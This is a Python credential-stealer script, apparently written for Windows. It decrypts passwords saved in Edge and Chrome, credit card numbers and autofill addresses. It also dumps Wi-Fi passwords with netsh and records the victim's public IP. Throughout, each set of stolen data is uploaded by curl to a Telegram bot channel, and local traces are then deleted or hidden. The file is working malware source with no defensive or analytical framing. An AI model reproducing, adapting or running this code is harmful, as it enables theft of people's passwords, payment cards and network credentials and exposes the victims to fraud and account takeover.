import requests
import subprocess, sys
import os
from os import environ, path
import json
from datetime import datetime, timedelta
import base64
import sqlite3
from Crypto.Cipher import AES
import shutil
from base64 import b64decode
import win32crypt
import win32api
import win32con
import socket
import time
from time import time,sleep
import re
#### Pub IP
public_ip = requests.get("https://api.ipify.org").text
os.system("echo Victim IP >> sys.txt")#removed systeminfo to improve perfomance
f = open("sys.txt", "a")
f.write(public_ip)
f.close()
#############Edge Grab
try:
    def get_encryption_key():
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Local", "Microsoft", "Edge",
                                        "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    def decrypt_password(password, key):
        try:
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return ""

    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Microsoft", "Edge", "User Data", "default", "Login Data")
    filename = "EdgeData.db"
    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        row[4]
        row[5]
        if username or password:
            result = (f"\nOrigin URL: {origin_url}\nAction URL: {action_url}\nUsername: {username}\nPassword: {password}")
            f = open("elog.txt", "a")
            f.write(result)
            f.close()
        else:
            continue
    cb_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Microsoft", "Edge", "User Data", "default", "Web Data")
    filename = "EdgeUata.db"
    shutil.copyfile(cb_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("select name_on_card, expiration_month, expiration_year, card_number_encrypted from credit_cards")
    for row in cursor.fetchall():
        name_on_card = row[0]
        expiration_month = row[1]
        expiration_year = row[2]
        card_number_encrypted = decrypt_password(row[3], key)
        if name_on_card or card_number_encrypted:
            result = (f"Full: {name_on_card}\nEXP: {expiration_month}Year: {expiration_year}\nCard: {card_number_encrypted}")
            f = open("ecc.txt", "a")
            f.write(result)
            f.close()
        else:
            continue
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("select company_name, street_address, city, zipcode, country_code from autofill_profiles")
    for row in cursor.fetchall():
        company_name = row[0]
        street_address = row[1]
        city = row[2]
        zipcode= row[3]
        country_code = row[4]
        if company_name or zipcode:
            result = (f"Company Name: {company_name}\nStreet Address: {street_address}\nCity: {city}\nZip Code: {zipcode}\nCountry Code: {country_code}")
            f = open("efull.txt", "a")
            f.write(result)
            f.close()
        else:
            continue
    cursor.close()
    db.close()
    try:
        os.remove('EdgeData.db')
        os.remove('EdgeUata.db')
        os.remove('EdgeData.db')
    except:
        pass
except Exception as e:
    print(e)
    #upload shit
os.system('curl -F document=@"elog.txt" https://api.telegram.org/botyoutele-api/sendDocument?chat_id=@youtele-channel')
os.system('curl -F document=@"ecc.txt" https://api.telegram.org/botyoutele-api/sendDocument?chat_id=@youtele-channel')
os.system('curl -F document=@"efull.txt" https://api.telegram.org/botyoutele-api/sendDocument?chat_id=@youtele-channel')
os.system('curl -F document=@"sys.txt" https://api.telegram.org/botyoutele-api/sendDocument?chat_id=@youtele-channel')
#win32api.SetFileAttributes("elog.txt", win32con.FILE_ATTRIBUTE_HIDDEN)
#win32api.SetFileAttributes("ecc.txt", win32con.FILE_ATTRIBUTE_HIDDEN)
#win32api.SetFileAttributes("efull.txt", win32con.FILE_ATTRIBUTE_HIDDEN)
#win32api.SetFileAttributes("sys.txt", win32con.FILE_ATTRIBUTE_HIDDEN)
#############Chrome Grab
try:
    def get_encryption_key():
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Local", "Google", "Chrome",
                                        "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    def decrypt_password(password, key):
        try:
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return ""

    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        row[4]
        row[5]
        if username or password:
            result = (f"\nOrigin URL: {origin_url}\nAction URL: {action_url}\nUsername: {username}\nPassword: {password}")
            f = open("clog.txt", "a")
            f.write(result)
            f.close()
        else:
            continue
    cb_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Web Data")
    filename = "ChromeUata.db"
    shutil.copyfile(cb_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("select name_on_card, expiration_month, expiration_year, card_number_encrypted from credit_cards")
    for row in cursor.fetchall():
        name_on_card = row[0]
        expiration_month = row[1]
        expiration_year = row[2]
        card_number_encrypted = decrypt_password(row[3], key)
        if name_on_card or card_number_encrypted:
            result = (f"Full: {name_on_card}\nEXP: {expiration_month}Year: {expiration_year}\nCard: {card_number_encrypted}")
            f = open("ccc.txt", "a")
            f.write(result)
            f.close()
        else:
            continue
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("select company_name, street_address, city, zipcode, country_code from autofill_profiles")
    for row in cursor.fetchall():
        company_name = row[0]
        street_address = row[1]
        city = row[2]
        zipcode= row[3]
        country_code = row[4]
        if company_name or zipcode:
            result = (f"Company Name: {company_name}\nStreet Address: {street_address}\nCity: {city}\nZip Code: {zipcode}\nCountry Code: {country_code}")
            f = open("cfull.txt", "a")
            f.write(result)
            f.close()
        else:
            continue
    cursor.close()
    db.close()
    try:
        os.remove(filename)
        os.remove('ChromeUata.db')
        os.remove('ChromeData.db')
        os.remove('elog.txt')
        os.remove('ecc.txt')
        os.remove('efull.txt')
        os.remove('sys.txt')
    except:
        pass
except Exception as e:
    print(e)
    #upload shit
os.system('curl -F document=@"clog.txt" https://api.telegram.org/botyoutele-api/sendDocument?chat_id=@youtele-channel')
os.system('curl -F document=@"ccc.txt" https://api.telegram.org/botyoutele-api/sendDocument?chat_id=@youtele-channel')
os.system('curl -F document=@"cfull.txt" https://api.telegram.org/botyoutele-api/sendDocument?chat_id=@youtele-channel')
#win32api.SetFileAttributes("clog.txt", win32con.FILE_ATTRIBUTE_HIDDEN)
#win32api.SetFileAttributes("ccc.txt", win32con.FILE_ATTRIBUTE_HIDDEN)
#had to be disabled in case no chrome so no files
#win32api.SetFileAttributes("cfull.txt", win32con.FILE_ATTRIBUTE_HIDDEN)
class GetWifiPassword:
    def __init__(self):
        self.command = "netsh wlan show profile"
        self.result = ""
        
    def start(self):
        networks = subprocess.check_output(self.command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
        networks = networks.decode(encoding="utf-8", errors="strict")
        network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks) 

        for network_name in network_names_list:
            try:
                command = "netsh wlan show profile " + network_name + " key=clear"
                current_result = subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
                current_result = current_result.decode(encoding="utf-8", errors="strict")        
                
                ssid = re.findall("(?:SSID name\s*:\s)(.*)", str(current_result))
                authentication = re.findall(r"(?:Authentication\s*:\s)(.*)", current_result)
                cipher = re.findall("(?:Cipher\s*:\s)(.*)", current_result)
                security_key = re.findall(r"(?:Security key\s*:\s)(.*)", current_result)
                password = re.findall("(?:Key Content\s*:\s)(.*)", current_result)
                
                self.result += "\n\nSSID           : " + ssid[0] + "\n"
                self.result += "Authentication : " + authentication[0] + "\n"
                self.result += "Cipher         : " + cipher[0] + "\n"
                self.result += "Security Key   : " + security_key[0] + "\n"
                self.result += "Password       : " + password[0] 
            except Exception:
                pass
        
        return self.result
        
if __name__ == '__main__':
    test = GetWifiPassword()
    result = test.start()
    f = open('wifi.txt', 'a')
    f.write(result)
    f.close()
os.system('curl -F document=@"wifi.txt" https://api.telegram.org/botyoutele-api/sendDocument?chat_id=@youtele-channel')
win32api.SetFileAttributes("wifi.txt", win32con.FILE_ATTRIBUTE_HIDDEN)
